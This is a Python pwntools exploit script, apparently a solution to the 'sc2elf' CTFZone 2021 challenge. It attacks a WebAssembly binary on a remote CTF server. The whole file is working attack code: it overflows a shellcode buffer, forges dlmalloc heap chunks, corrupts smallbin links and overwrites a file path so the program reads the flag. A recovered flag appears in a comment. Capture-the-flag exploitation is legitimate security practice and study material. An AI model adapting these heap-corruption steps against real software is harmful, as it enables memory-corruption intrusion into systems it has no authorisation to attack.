#!/usr/bin/env python3
import threading

from pwn import *

g_kaboomfp = None


def connect():
    if args.LOCAL:
        return gdb.debug(
            [
                os.path.expanduser("~/.wasmtime/bin/wasmtime"),
                "-g",
                "sc2elf.wasm",
                "--dir",
                "./",
            ],
            api=True,
        )
    else:
        return remote("sc2elf.2021.ctfz.one", 31337)


PROMPT = "5. Exit"


def prompt(tube, choice):
    data = f"{choice}\n"
    g_kaboomfp.write(data)
    tube.sendafter(PROMPT, data)


def encode_shellcode(shellcode):
    return base64.b16encode(shellcode).decode()


def set_encoded_shellcode(tube, encoded_shellcode):
    prompt(tube, 1)
    data = encoded_shellcode + "\n"
    g_kaboomfp.write(data)
    tube.sendafter("Paste base16 encoded shellcode:", data)


def set_shellcode(tube, shellcode):
    set_encoded_shellcode(tube, encode_shellcode(shellcode))


def set_header(tube, header):
    prompt(tube, 2)
    data = base64.b16encode(header).decode() + "\n"
    g_kaboomfp.write(data)
    tube.sendafter("Paste base16 encoded header:", data)


def get_result_send(tube):
    prompt(tube, 3)


def get_result_recv(tube):
    tube.recvuntil("Result: ")
    return bytes.fromhex(tube.recvline().decode())


def get_result(tube):
    get_result_send(tube)
    return get_result_recv(tube)


def print_description(tube):
    prompt(tube, 4)


def exit(tube):
    prompt(tube, 5)


def finish(tube):
    tube.gdb.execute("finish &")
    time.sleep(0.1)
    while True:
        try:
            tube.gdb.parse_and_eval("$rip")
        except tube.gdb.error as ex:
            if "gdb.error: Selected thread is running." in ex:
                continue
            raise
        finally:
            break
    time.sleep(0.1)
    tube.gdb.wait()


PINUSE_BIT = 1
CINUSE_BIT = 2
PATH_ADDR = 2040
PATH_OFFSET = 96  # 0x000a3631
FLAG_PATH = b"flag.txt\0"
SIZEOF_FILE = 1144
# (gdb) x/184bx __vmctx->memory+0x798
ORIG_TXT = """
0x7f8b44000798:	0x31	0x36	0x0a	0x00	0xe8	0x13	0x00	0x00
0x7f8b440007a0:	0x65	0x20	0x62	0x61	0x73	0x65	0x31	0x36
0x7f8b440007a8:	0x20	0x65	0x6e	0x63	0x6f	0x64	0x65	0x64
0x7f8b440007b0:	0x20	0x68	0x65	0x61	0x64	0x65	0x72	0x3a
0x7f8b440007b8:	0x20	0x00	0x49	0x6e	0x76	0x61	0x6c	0x69
0x7f8b440007c0:	0x64	0x20	0x69	0x6e	0x70	0x75	0x74	0x2c
0x7f8b440007c8:	0x20	0x68	0x65	0x61	0x64	0x65	0x72	0x20
0x7f8b440007d0:	0x6d	0x75	0x73	0x74	0x20	0x62	0x65	0x20
0x7f8b440007d8:	0x69	0x6e	0x20	0x62	0x61	0x73	0x65	0x31
0x7f8b440007e0:	0x36	0x20	0x61	0x6e	0x64	0x20	0x62	0x65
0x7f8b440007e8:	0x20	0x38	0x34	0x20	0x62	0x79	0x74	0x65
0x7f8b440007f0:	0x73	0x20	0x6c	0x6f	0x6e	0x67	0x0a	0x00
0x7f8b440007f8:	0x74	0x6d	0x70	0x6c	0x2f	0x65	0x6c	0x66
0x7f8b44000800:	0x2e	0x74	0x6d	0x70	0x6c	0x00	0x72	0x62
0x7f8b44000808:	0x00	0x25	0x73	0x00	0x25	0x30	0x32	0x78
0x7f8b44000810:	0x00	0x0a	0x00	0x2f	0x00	0x2e	0x00	0x2e
0x7f8b44000818:	0x00	0x2e	0x2f	0x00	0x72	0x77	0x61	0x00
0x7f8b44000820:	0x90	0x11	0x00	0x00	0x08	0x12	0x00	0x00
0x7f8b44000828:	0x72	0x77	0x61	0x00	0x53	0x75	0x63	0x63
0x7f8b44000830:	0x65	0x73	0x73	0x00	0x49	0x6c	0x6c	0x65
0x7f8b44000838:	0x67	0x61	0x6c	0x20	0x62	0x79	0x74	0x65
0x7f8b44000840:	0x20	0x73	0x65	0x71	0x75	0x65	0x6e	0x63
0x7f8b44000848:	0x65	0x00	0x44	0x6f	0x6d	0x61	0x69	0x6e
"""
ORIG = bytes(
    (int(val, 16) for line in ORIG_TXT.split("\n") for val in line.split()[1:])
)
assert len(ORIG) == 184


def main():
    print(
        """
initial heap state:
hdr(8+84+4) - shell(8+160+8) - result(8+244+4)
hdr@   0x00011db0
shell@ 0x00011e10
result@0x00011ec0
(lldb) x/16bx __vmctx->memory+0x00011ec0-8
0x7ffe60011eb8: 0x00 0x00 0x00 0x00 0x03 0x01 0x00 0x00
0x7ffe60011ec0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00
"""
    )

    global g_kaboomfp
    with connect() as tube, open("kaboom", "w") as g_kaboomfp:

        def check_smallbin(exp_smallbin_fd, exp_smallbin_bk, exp_smallmap=0x40004):
            tube.gdb.execute("frame 15")
            smallmap = int(tube.gdb.parse_and_eval("*(int*)(__vmctx->memory+1216*4)"))
            print(f"smallmap = 0x{smallmap:x}")
            assert smallmap == exp_smallmap
            smallbin_fd = int(
                tube.gdb.parse_and_eval("*(int*)(__vmctx->memory+0x13b8+8)")
            )
            print(f"smallbin_fd = 0x{smallbin_fd:x}")
            assert smallbin_fd == exp_smallbin_fd
            smallbin_bk = int(
                tube.gdb.parse_and_eval("*(int*)(__vmctx->memory+0x13b8+12)")
            )
            print(f"smallbin_bk = 0x{smallbin_bk:x}")
            assert smallbin_bk == exp_smallbin_bk
            print(
                tube.gdb.execute("x/16bx __vmctx->memory+0x00011ec0-8", to_string=True)
            )

        if args.LOCAL:
            tube.gdb.execute("set pagination off")
            tube.gdb.continue_nowait()
        print(
            """
Fill the address space with FILE objects to cover addresses like 0x000a3631.
"""
        )
        count = 500  # (0x000a3631 - 0x00011db0) / SIZEOF_FILE
        for i in range(count):
            print(f"{i}/{count}")
            set_header(tube, b"\x00" * 84)
            get_result(tube)
        print(
            """
Prevent fopen() in get_result().
"""
        )
        set_header(
            tube,
            flat(
                {
                    0: b"\x7fELF",
                },
                length=84,
            ),
        )

        print(
            """
Bug: shellcode buffer overflow.
1) Increase config.shellcode_size.
2) The size of the result chunk is > 236, therefore it goes into the treemap.
   Make life easier and replace it with two forged chunks.
"""
        )
        set_shellcode(
            tube,
            b"S" * 168
            + struct.pack("<II", 0, 144 | PINUSE_BIT | CINUSE_BIT)
            + b"s" * (144 - 8)
            + struct.pack("<II", 0, 112 | PINUSE_BIT | CINUSE_BIT)
            + b"s" * (112 - 8),
        )
        if args.LOCAL:
            time.sleep(0.1)
            tube.gdb.interrupt_and_wait()
            check_smallbin(0x13B8, 0x13B8, 0x4)
            tube.gdb.continue_nowait()

        print(
            """
Reallocate the result.
Bug: the shellcode pointer is not updated.
The first forged result chunk ends up in the smallbin-112.
"""
        )
        get_result(tube)
        if args.LOCAL:
            time.sleep(0.1)
            tube.gdb.interrupt_and_wait()
            check_smallbin(0x11EB8, 0x11EB8)
            tube.gdb.continue_nowait()

        print(
            """
Overwrite the smallbin links in the freed forged result chunk.
Repair the next forged chunk, which was damaged by the overflow in get_result().
"""
        )
        set_shellcode(
            tube,
            b"S" * 168
            + struct.pack(
                "<IIII",
                0,
                144 | PINUSE_BIT,
                PATH_ADDR - PATH_OFFSET - 8,
                PATH_ADDR - PATH_OFFSET - 8,
            )
            + b"s" * (144 - 8 - 8)
            + struct.pack("<II", 0, 112 | CINUSE_BIT)
            + b"s" * (112 - 8),
        )
        if args.LOCAL:
            time.sleep(0.1)
            tube.gdb.interrupt_and_wait()
            check_smallbin(0x11EB8, 0x11EB8)
            tube.gdb.continue_nowait()

        print(
            """
Force reading header from the file.
"""
        )
        set_header(tube, b"\x00" * 84)
        if args.LOCAL:
            time.sleep(0.1)
            tube.gdb.interrupt_and_wait()
            check_smallbin(PATH_ADDR - PATH_OFFSET - 8, 0x11EB8)
            tube.gdb.continue_nowait()

        print(
            """
Change the shellcode size so that the result chunk size becomes 144.
"""
        )
        set_shellcode(tube, b"\x00" * (144 - 8 - 84))
        if args.LOCAL:
            time.sleep(0.1)
            tube.gdb.interrupt_and_wait()
            check_smallbin(PATH_ADDR - PATH_OFFSET - 8, 0x11EB8)
            tube.gdb.continue_nowait()

        print(
            """
Overwrite the template path.
"""
        )
        if args.LOCAL:
            tube.gdb.interrupt_and_wait()
            tube.gdb.Breakpoint("dlmalloc", temporary=True)
            tube.gdb.continue_nowait()
        shellcode = bytearray(ORIG[: 144 - 8])
        shellcode[PATH_OFFSET : PATH_OFFSET + len(FLAG_PATH)] = FLAG_PATH
        encoded_shellcode = encode_shellcode(shellcode)
        # make base16_decode() fail at the end (after writing the stuff that
        # we care about though) so that set_shellcode() wouldn't do
        # base16_free(), which does memset()
        encoded_shellcode = encoded_shellcode[:-1] + "X"
        set_encoded_shellcode(tube, encoded_shellcode)
        if args.LOCAL:
            tube.gdb.wait()
            finish(tube)
            eax = int(tube.gdb.parse_and_eval("$eax"))
            print(hex(eax))
            assert eax == PATH_ADDR - PATH_OFFSET
            tube.gdb.continue_nowait()

        # if args.LOCAL:
        #    tube.gdb.interrupt_and_wait()
        #    tube.gdb.Breakpoint("fopen", temporary=True)
        #    tube.gdb.continue_nowait()
        # ctfzone{A8Rvn4v622vmkbyAeQSRv8gzSD57NLtx}
        print(get_result(tube))

        g_kaboomfp.flush()
        tube.interactive()


if __name__ == "__main__":
    main()
